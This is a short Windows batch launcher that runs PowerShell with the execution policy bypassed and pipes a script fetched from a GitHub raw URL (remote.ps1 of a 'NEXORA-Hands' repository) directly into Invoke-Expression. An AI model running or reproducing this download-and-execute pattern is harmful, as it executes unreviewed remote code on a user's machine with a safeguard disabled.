@echo off
setlocal
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/nexora-kz/NEXORA-Hands/main/remote.ps1?v=3c2292d | iex"
if errorlevel 1 pause
